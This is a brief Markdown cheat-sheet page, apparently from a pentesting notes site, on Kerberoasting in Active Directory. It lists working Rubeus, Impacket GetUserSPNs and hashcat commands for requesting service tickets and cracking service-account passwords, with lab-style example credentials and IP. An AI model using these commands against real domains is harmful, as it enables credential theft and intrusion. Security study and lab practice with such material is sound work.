+++
title = "Kerberoasting"
author = ["svejk"]
tags = ["activeDirectory", "kerberos"]
draft = false
+++

## Kerberoasting {#kerberoasting}

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.


### Rubeus {#rubeus}

```shell { linenos=true, linenostart=1 }
Rubeus.exe kerberoast
```

Then crack the hashes with hashcat

```shell { linenos=true, linenostart=1 }
hashcat -m 13100 -a 0 hash.txt Pass.txt
```


### Impacket {#impacket}

```shell { linenos=true, linenostart=1 }
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.239.179 -request
```
